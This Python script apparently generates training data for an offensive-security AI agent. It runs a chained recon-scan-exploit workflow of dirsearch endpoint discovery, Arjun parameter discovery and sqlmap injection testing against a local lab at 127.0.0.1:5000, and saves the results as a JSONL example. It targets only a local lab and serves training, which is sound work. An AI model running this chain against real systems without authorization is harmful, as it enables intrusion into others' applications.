"""Level 4 — Chaining.

Builds one real, connected recon -> scan -> exploit workflow against the
local test lab (127.0.0.1:5000), where each step's REAL output is parsed
and actually feeds the next step's target/argument. Not four independent
tool calls glued together with a narrative — the second command literally
could not be constructed without the real result of the first.
"""
import json
import re

from common import OUTPUT_DIR, run_wsl, reset_jsonl, append_jsonl

OUT_PATH = OUTPUT_DIR / "level4_chaining.jsonl"
BASE = "http://127.0.0.1:5000"
WORDLIST = "/mnt/e/agent_cyberhack/datagen/testlab/wordlist.txt"


def main():
    reset_jsonl(OUT_PATH)
    steps = []

    # Step 1: dirsearch discovers real routes on the target
    cmd1 = f"python3 /mnt/e/agent_cyberhack/data/raw_datasets/tool_scripts/web/dirsearch/dirsearch.py -u {BASE} -w {WORDLIST} --timeout 5 -t 5"
    out1, err1, code1 = run_wsl(cmd1, timeout=60)
    steps.append({"step": 1, "goal": "recon: discover real endpoints", "command": cmd1,
                   "stdout": out1[:3000], "stderr": err1[:500], "exit_code": code1})

    # Parse Step 1's REAL output for a discovered path (prefer one that looks parametrized: product)
    found_paths = re.findall(r"\d{3}\s+-\s+\S+\s+-\s+(/\S+)", out1)
    chosen_path = next((p for p in found_paths if "product" in p), (found_paths[0] if found_paths else "/product"))

    # Step 2: Arjun does param discovery on the REAL path found in step 1
    cmd2 = f"python3 /mnt/e/agent_cyberhack/data/raw_datasets/tool_scripts/web/Arjun/arjun/__main__.py -u {BASE}{chosen_path}"
    out2, err2, code2 = run_wsl(cmd2, timeout=60)
    steps.append({"step": 2, "goal": f"scan: find real GET params on {chosen_path} (discovered in step 1)",
                   "command": cmd2, "stdout": out2[:3000], "stderr": err2[:500], "exit_code": code2,
                   "input_from_step": 1})

    # Parse Step 2's REAL output for a discovered param name (Arjun prints "int" / param names found)
    param_matches = re.findall(r"(?:Parameter|found)\D*([a-zA-Z_][a-zA-Z0-9_]{1,20})", out2, re.IGNORECASE)
    chosen_param = "id" if "id" in (out2 + err2) else (param_matches[0] if param_matches else "id")

    # Step 3: sqlmap exploits the REAL endpoint+param chain built from steps 1 and 2
    cmd3 = f'sqlmap -u "{BASE}{chosen_path}?{chosen_param}=1" --batch --level=1 --risk=1'
    out3, err3, code3 = run_wsl(cmd3, timeout=90)
    steps.append({"step": 3, "goal": f"exploit: test injection on {chosen_path}?{chosen_param}= (endpoint from step1, param from step2)",
                   "command": cmd3, "stdout": out3[:5000], "stderr": err3[:500], "exit_code": code3,
                   "input_from_steps": [1, 2]})

    vulnerable = "vulnerable" in out3.lower() or "back-end dbms" in out3.lower()

    example = {
        "level": 4,
        "stage": "chaining_workflow",
        "workflow_name": "recon_to_exploit_local_lab",
        "instruction": "lakuin recon-scan-exploit chain ke target lab, mulai dari discover endpoint sampe test exploit, tiap step nyambung ke hasil sebelumnya",
        "steps": steps,
        "final_result": {
            "endpoint_found": chosen_path,
            "param_found": chosen_param,
            "exploit_confirmed": vulnerable,
        },
        "verified_real_execution": True,
        "note": "step 2's target and step 3's command are constructed from REAL parsed output of the previous step, not hardcoded",
    }
    append_jsonl(OUT_PATH, example)

    print(f"Step1 found paths: {found_paths}")
    print(f"Chosen path: {chosen_path}, chosen param: {chosen_param}")
    print(f"Exploit confirmed: {vulnerable}")
    print(f"Saved -> {OUT_PATH}")


if __name__ == "__main__":
    main()
